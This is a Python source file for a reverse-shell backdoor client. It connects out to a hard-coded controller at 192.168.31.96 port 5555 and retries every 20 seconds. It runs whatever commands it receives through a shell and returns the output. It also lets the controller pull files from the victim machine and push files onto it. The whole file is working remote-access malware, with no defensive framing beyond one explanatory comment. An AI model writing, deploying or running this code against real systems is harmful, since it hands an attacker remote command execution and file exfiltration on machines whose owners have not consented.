import socket
import time
import subprocess
import json
import os

def reliable_send(data):
        jsondata = json.dumps(data)
        s.send(jsondata.encode())


def reliable_recv():
        data = ''
        while True:
                try:
                        data = data + s.recv(1024).decode().rstrip()   #this recv method is from socket lib like send this recieve data 1024 bytes of data and decode because we have encoded the data rstrip to remove spaces
                        return json.loads(data)
                except ValueError:
                        continue

def connection():
	while True:
		time.sleep(20)
		try:
			s.connect(('192.168.31.96', 5555))
			shell()
			s.close()
			break
		except:
			connection()


def upload_file(file_name):
	f = open(file_name, 'rb')
	s.send(f.read())
	f.close()

def download_file(file_name):
	f = open(file_name, "wb")
	s.settimeout(1)
	chunk = s.recv(1024)
	while chunk:
		f.write(chunk)
		try:
			chunk = s.recv(1024)
		except socket.timeout as e:
			break
	s.settimeout(None)
	f.close()

def shell():
	while True:
		command = reliable_recv()
		if command == 'quit':
			break
		elif command[:3] == 'cd ':
			os.chdir(command[3:])
		elif command == 'clear':
			pass
		elif command[:8] == 'download':
			upload_file(command[9:])
		elif command[0:6] == 'upload':
			download_file(command[7:])
		else:
			#execute the command
			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = execute.stdout.read() + execute.stderr.read()
			result = result.decode()
			reliable_send(result)
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()